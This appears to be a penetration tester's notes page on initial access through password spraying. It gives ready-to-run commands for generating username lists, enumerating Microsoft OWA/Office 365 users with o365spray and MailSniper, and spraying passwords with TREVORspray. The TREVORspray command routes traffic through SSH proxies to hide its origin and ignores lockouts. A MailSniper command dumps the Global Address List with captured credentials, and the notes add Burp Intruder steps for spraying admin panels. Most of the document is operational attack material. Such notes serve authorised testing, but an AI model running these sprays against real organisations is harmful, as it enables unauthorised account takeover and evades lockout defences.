## Creating Username Lists

I typically use namemash.py to generate usernames if I cannot find the naming format elsewhere. Put full names in a wordlist and just pass it to namemash to generate username combos.

 https://gist.github.com/superkojiman/11076951 

```bash
python3 namemash.py usernames.txt
```

## Initial Access via Password Spraying Microsoft OWA/Exchange

We can use password spraying as an alternative to brute forcing. This involves sending one specially crafted password against multiple usernames. Lots of these tools also offter the ability to enumerate users, which is possible due to a delay in the response time from OWA when a username is valid.

On Linux, I like goMapEnum or o365Spray:

 https://github.com/nodauf/GoMapEnum 

 https://github.com/0xZDH/o365spray 

```bash
# Enumerate valid users from an email list for example.com
python3 /opt/o365spray/o365spray.py -d example.com --enum -U emails_list.txt --sleep 45 --rate 5 --jitter 25
```

TREVORSpray also has some nice functionality to route your traffic through various proxies. This is useful if you set up loads of free EC2 instances and supply them as an `--ssh` flag. This is beneficial to obfuscate the location your requests are coming from.

 https://github.com/blacklanternsecurity/TREVORspray 

```bash
# Spray password123 at the email list through the 10.10.10.10 box. Don't use current IP (-n)
trevorspray --users 'email_list.txt' -p 'password123' -i key.pem --ssh ubuntu@10.10.10.10 --delay 60 --lockout-delay 300 --jitter 100 -n -m msol  --ignore-lockouts
```

On Windows:
 https://github.com/dafthack/MailSniper 

```powershell
# Find the domain's netbios name
Invoke-DomainHarvestOWA -ExchHostName 10.10.10.10

# Test Usernames
Invoke-UsernameHarvestOWA -ExchHostname 10.10.10.10 -Domain MATRIX -UserList .\usernames.txt -OutFile valid_users.txt

# Spray Passwords
Invoke-PasswordSprayOWA -ExchHostname 10.10.10.10 -UserList .\usernames.txt -Password 'P@ssw0rd!'

# Obtain Global Address List after finding valid creds -> Repeat the attack after with newly obtained e-mails!
Get-GlobalAddressList -ExchHostname 10.10.10.10 -UserName MATRIX\Neo -Password 'P@ssw0rd!' -OutFile global_address_list.txt
```

## Password Spraying Admin Panels

Try to enumerate users - Can you try to sign up an account called admin and receive a "user already exists" message? When you login, does it invalidate it with just "wrong username"? Secure sites will not give you any hints. Infact, they really should just say "Error" no matter what happens during the login/signup process to stop giving attackers information, but this comes at the cost of lower satisfaction levels for genuine users.

Trying to create a user account and ascertain the lockout policy. Is there one? What's the password policy and is it enforced properly? This will help optimize your attack. I like to use Burp for admin panel spraying just because you can add Macros to handle tokens that may change. 

First attempt a login, then send the request to the Intruder. Clear the pre-set fields and highlight the username field, we're password spraying still so we'll use one password at a time and move onto brute forcing if there's no hits. Click add. Go to payloads and load your wordlist in. Modify any threads and send it off. Use response lengths and status codes to ascertain success.